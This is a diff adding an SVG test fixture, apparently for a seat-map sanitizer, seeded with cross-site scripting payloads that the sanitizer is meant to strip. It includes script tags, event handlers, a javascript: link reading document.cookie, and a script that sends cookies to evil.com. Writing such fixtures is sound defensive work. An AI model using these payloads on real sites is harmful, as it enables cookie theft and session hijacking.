@@ -1,0 +1,17 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 100">
+  <!-- Malicious content — sanitization should strip all of these -->
+  <script>alert('xss')</script>
+  <rect id="row1-seat1" x="10" y="10" width="20" height="20" onclick="stealCookies()" onload="malware()" />
+  <rect id="row1-seat2" x="40" y="10" width="20" height="20" />
+  <a href="javascript:alert(document.cookie)">
+    <rect id="row1-seat3" x="70" y="10" width="20" height="20" />
+  </a>
+  <foreignObject width="200" height="100">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <script>document.location='https://evil.com/?c='+document.cookie</script>
+      <p>Injected HTML content</p>
+    </body>
+  </foreignObject>
+  <use href="https://evil.com/payload.svg#exploit" />
+  <rect id="row2-seat1" x="10" y="50" width="20" height="20" />
+</svg>
